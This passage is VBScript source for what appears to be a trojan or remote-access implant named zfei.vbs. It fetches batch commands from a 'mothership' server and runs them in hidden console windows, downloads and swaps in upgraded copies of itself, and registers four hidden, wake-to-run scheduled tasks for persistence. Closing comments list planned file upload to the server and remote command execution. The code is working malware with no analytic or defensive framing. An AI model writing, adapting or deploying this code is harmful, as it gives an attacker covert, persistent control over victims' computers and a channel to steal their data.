        Call LogMsg("cmdlist - ping file size: " & Len(strFileContent) )

        If InStr(strFileContent, "execute_cmdlist") > 0 Then
            Call LogMsg("cmdlist - found execcmdlist" )

            execcmdlist = True
        End If

        Call LogMsg("cmdlist: reseting ping.txt" )

        Call RunShell("conhost.exe --headless cmd /c type nul > " & workdir & "\" & "ping.txt", True)
        Reset(workdir & "\" & "ping.txt")
        
        If Not execcmdlist Then
            Exit Do
        End If

        Call LogMsg("cmdlist - downloading bbti.bat" )
     
        Dim filepath : filepath = workdir & "\" & "bbti.bat"
        
        Call RunShell("conhost.exe --headless cmd /c type nul > " & filepath, True)
        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & filepath, True)
                
        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat" & GetScripTagStrUrl()
        
        Call DownloadFile( url, filepath )

        If fso.FileExists( filepath ) Then 
            Call LogMsg("cmdlist - running bbti.bat" )

            Dim filext : filext = fso.GetExtensionName(filepath)

            If LCase(filext) = "bat" Then
                Call RunShell("conhost.exe --headless cmd /c " & filepath & " > " & workdir & "\" & "bbti.bat_cmds.log", false)
            ElseIf LCase(filext) = "vbs" Then
                Call RunShell("conhost.exe --headless cscript.exe //nologo //B " & filepath, false)
            End If
        End If
        
        Exit Do
    Loop
    

        Call LogMsg("cmdlist sleeping " & CStr(cmdlistdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep cmdlistdelaytime*1000
    
    Loop

End Function

Function CreateTaskXMLStr(xmlstr, tasknamestr)
    Call LogMsg("CreateTaskXMLStr: " & tasknamestr )
    
    If XIsEmpty(xmlstr) Then
        Exit Function
    End IF
    
    If XIsEmpty(tasknamestr) Then
        Exit Function
    End IF

    Dim fname : fname = tasknamestr & ".xml"
    
    Call WriteTaskXML(fname, xmlstr)

    Call LogErr()

    If fso.FileExists(workdir & "\" & fname) Then
        Call CreateTaskXML(tasknamestr, workdir & "\" & fname)
    End If

    Call LogErr()
    
End Function

Function Reschedule()   
    cmdname = "reschedule"
 
    Call LogMsg("Reschedule starting")
    
    Dim xmlstr 
    Dim ptaskname 

    ptaskname = tskname & "_" & "daily_task"
    xmlstr = GetDailyTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr, ptaskname)
    
    ptaskname = tskname & "_" & "idle_task"
    xmlstr = GetIdleTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr,ptaskname)

    ptaskname = tskname & "_" & "rep_task"
    xmlstr = GetRepTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr,ptaskname)

				 
    ptaskname = tskname & "_" & "time_task"
    xmlstr = GetTimeTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr, ptaskname)
		  
    
    Call LogMsg("Reschedule finished")
End Function

Function ReadCmdPid(tcmdname)
    Call LogMsg("ReadCmdPid " & tcmdname)
    
    ReadCmdPid = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF
    
    If fso.FileExists(workdir & "\" & tcmdname & "_running") Then
        ReadCmdPid = ReadTag(workdir & "\" & tcmdname & "_running")
    Else
        Call LogMsg("ReadCmdPid " & tcmdname & " running file does not exist -- exiting function")

        Exit Function
    End If
    
    ReadCmdPid = CInt(ReadCmdPid)

    Call LogMsg("ReadCmdPid pid=" & ReadCmdPid)

End Function

Function IsCmdLockFile(tcmdname)
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("IsCmdLockFile -- " & tcmdname)
    
    IsCmdLockFile = false

    Dim cmdlockfile : cmdlockfile = false
    Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & tcmdname & "_running", 2, True)

    If Err.Number <> 0 Then
        ' If Err.Number is 70, another process has the file locked
        IsCmdLockFile = true
        Err.Clear
    Else
        objFile.Close ' Releases the lock
        set objFile = nothing
    End If

End Function

Function IsCmdRunning(tcmdname, ByRef tprocname)
    
    Call LogMsg("IsCmdRunning -- " & tcmdname)
    tprocname = ""
    
    IsCmdRunning = -1

    Dim list
    Set list = GetProcessList()
    
    If list Is Nothing Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    If list.Count = 0 Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    Dim cmdpid : cmdpid = ReadCmdPid(tcmdname)
    
    Call LogMsg("IsCmdRunning read pid=" & CStr(cmdpid))

    If Not cmdpid > 0 Then
        Call LogMsg("IsCmdRunning cmdpid negative -- exiting function")
        Exit Function
    End If
    
    Dim itemKey
    Dim item
    For Each itemKey in list
        item = list.Item(itemKey)

        Dim procname : procname = item(0)       
        Dim pid : pid = item(1)
        
        If ( pid = cmdpid ) Then
            IsCmdRunning = pid
            tprocname = procname
            Call LogMsg("IsCmdRunning found matching pid=" & CStr(pid) & " procname=" & procname)
            Call LogMsg("IsCmdRunning -- exiting function")
            Exit Function
        End IF

    Next

    Call LogMsg("IsCmdRunning failed to find match")
    
End Function

Function ExecCmd(tcmdname)
    ExecCmd = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF										 

    Call LogMsg("ExecCmd " & tcmdname)

    Dim pid : pid = ExecShellAsync("cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " " & tcmdname)
		  
    Dim cmdrunpath : cmdrunpath = workdir & "\" & tcmdname & "_running"

    If pid > 0 Then
        If fso.FileExists(cmdrunpath) Then
            fso.DeleteFile cmdrunpath, True
        End If

        Dim objFile : Set objFile = fso.OpenTextFile(cmdrunpath, 2, True)
        objFile.Write CStr(pid)

        objFile.Close
        Set objFile = Nothing
        
        Call LogMsg("ExecCmd -- created running file " & cmdrunpath & " with pid=" & pid)
    End IF
    
    ExecCmd = pid
End Function

Function ActivateCmd(tcmdname)       
    ActivateCmd = -1

    If XIsEmpty(tcmdname) Then
        Exit Function
    End If

    Call LogMsg("ActivateCmd: cmdname=" & tcmdname)

    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, procname)

    Call LogMsg("ActivateCmd: procname=" & procname & " cmdpid=" & CStr(cmdpid))
    
    If cmdpid > 0 Then
					 
        ActivateCmd = cmdpid
        
        Call LogMsg("ActivateCmd: cmd is running -- no need to launch")
       
    Else
        Call LogMsg("ActivateCmd: cmd is not running -- starting it up " & tcmdname)
        
        ActivateCmd = ExecCmd(tcmdname)
	
	    Call LogMsg("ActivateCmd: pid=" & CStr(ActivateCmd))
    End If
    
End Function

Function Activate()
    
    Dim cmd
    For Each cmd in Array("watchdog", "ping", "cmdlist")
        ActivateCmd(cmd)
    Next
    
End Function

Function Upgrade()
	On Error Resume Next
	Err.Clear
	
    Call LogMsg("Upgrade")
	
	Upgrade = -1
	
	Randomize 
	Dim min, max, result
	min = 1000
	max = 9999
	result = Int((max - min + 1) * Rnd + min)
	result = CStr(result)
	
	Dim upgradepath : upgradepath = workdir & "\" & "zfei_upgrade_" & result & ".vbs"
	Call DownloadFile(mothership & "/ow/assets/zfei.vbs", upgradepath)
	
	Call DownloadFile(mothership & "/ow/assets/zfei.vbs.md5", upgradepath & ".md5")

	Dim upgrademd5 : upgrademd5 = ReadFile(upgradepath & ".md5")

	If Not fso.FileExists(upgradepath) then
	    Call LogMsg("Upgrade failed -- not able to download upgrade")
		Exit Function
	End IF
	
	Dim strContent : strContent = ReadFile(upgradepath)

	If Not InStr(strContent, "Option Explicit") > 0 Then
	    Call LogMsg("Upgrade failed -- upgrade does not contain [Option Explicit] tag")
		Exit Function
	End IF
	
	Call RunShell("conhost.exe --headless cmd /c certutil -hashfile " & upgradepath & " MD5 | findstr /v hash > " & upgradepath & ".md5.check" , True)
	
	Dim upgrademd5check : upgrademd5check = ReadFile(upgradepath & ".md5.check")

	If not ( XIsEmpty(upgrademd5check) or XIsEmpty(upgrademd5) ) then
		If ( upgrademd5check = upgrademd5 ) then
			Call TryCopyFile(upgradepath, workdir & "\zfei.vbs")
		End if
	End If
	
	If Err.Number = 0 Then
		Upgrade = 1
	End IF
	
End Function

Function StartupLogic()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("StartupLogic")

    TryDeleteFile(workdir & "\" & "killall")

    Dim srcpath : srcpath = workdir & "\zfei.vbs"
    Dim objFile : Set objFile = fso.GetFile(srcpath)
    Dim srcmoddate : srcmoddate = objFile.DateLastModified

    Dim cmd
    For Each cmd in Array("watchdog", "ping", "cmdlist")
        
        Call TryDeleteFile(workdir & "\" & "reset_" & cmd & "loop" )

															  
		
																   
					   
			
											
											   
			
		
											   
												  

											
																			  

											
												   
				  
		
			  

    Next 

    If cmdname = "init" Then
        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " reschedule")    
																						 
																						  
    End IF

    Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " retrieve")
    Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " penetrate")

    Activate()
    
    Call LogMsg("StartupLogic -- logging errors if any")
    Call LogErr()

    Call LogMsg("StartupLogic -- finished")
End Function

Function GetIdleTaskXMLStr(intaskname)
    Dim futureTime : futureTime = DateAdd("n", 5, Now)
    Dim tasktimestr : tasktimestr = ToTaskTime(futureTime)
    
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\"&intaskname&"</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _
                 "<IdleTrigger>" & _
                 "<StartBoundary>" & tasktimestr & "</StartBoundary>" & _
                 "</IdleTrigger>" & _
                 "</Triggers>" & _
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                 "<IdleSettings>" & _
                 "<Duration>PT1M</Duration>" & _
                 "<WaitTimeout>PT1H</WaitTimeout>" & _
                 "<StopOnIdleEnd>true</StopOnIdleEnd>" & _
                 "<RestartOnIdle>false</RestartOnIdle>" & _
                 "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetIdleTaskXMLStr = taskxmlstr
End Function

Function GetRepTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _ 
                 "<CalendarTrigger>" & _ 
                 "<StartBoundary>2026-04-30T09:00:00</StartBoundary>" & _ 
                 "<Repetition>" & _ 
                 "<Interval>PT" & tskxmltime & "M</Interval>" & _ 
                 "<StopAtDurationEnd>false</StopAtDurationEnd>" & _ 
                 "</Repetition>" & _ 
                 "<ScheduleByDay>" & _ 
                 "<DaysInterval>1</DaysInterval>" & _ 
                 "</ScheduleByDay>" & _ 
                 "</CalendarTrigger>" & _ 
                 "</Triggers>" & _ 
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetRepTaskXMLStr = taskxmlstr
End Function

Function GetTimeTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _ 
                 "<TimeTrigger>" & _ 
                 "<StartBoundary>2008-09-01T03:00:00</StartBoundary>" & _ 
                 "<Repetition>" & _ 
                 "<Interval>PT"&CStr(timetaskxmltime)&"M</Interval>" & _ 
                 "</Repetition>" & _ 
                 "<RandomDelay>PT30S</RandomDelay>" & _ 
                 "</TimeTrigger>" & _ 
                 "</Triggers>" & _ 
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetTimeTaskXMLStr = taskxmlstr
End Function

Function GetDailyTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _
                 "<CalendarTrigger>" & _
                 "<StartBoundary>2026-04-26T09:45:21</StartBoundary>" & _
                 "<Enabled>true</Enabled>" & _
                 "<ScheduleByDay>" & _
                 "<DaysInterval>1</DaysInterval>" & _
                 "</ScheduleByDay>" & _
                 "</CalendarTrigger>" & _
                 "</Triggers>" & _
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetDailyTaskXMLStr = taskxmlstr
End Function

Function WriteTaskXML(fname, xmlstr)
    Dim taskxmlstr : taskxmlstr = xmlstr ' GetTaskXMLStr()
    Dim xmlfObj : Set xmlfObj = fso.OpenTextFile(workdir & "\" & fname, 2, True)

    If Not xmlfObj Is Nothing Then
        xmlfObj.WriteLine taskxmlstr
    End If
End Function

Function SelfDestruct()
' delete all regs, startup path, and trojandir, etc.
End Function

' additional cmds: 
' get all running process (wmic, etc.)
' dump tasks
' upgrade
' upload a file to mothership
' download a file from mothership
' exec a pre existing vbs/bat/ps1 script
' scan trojan dir, delete a file, rename, move, copy, file exists, schedule task, delete task, execute task
' execute HTTP GET, POST request
' execute a one-line cmd, upload output
'  
' execvbs --> extend to ps1, bat, vbs script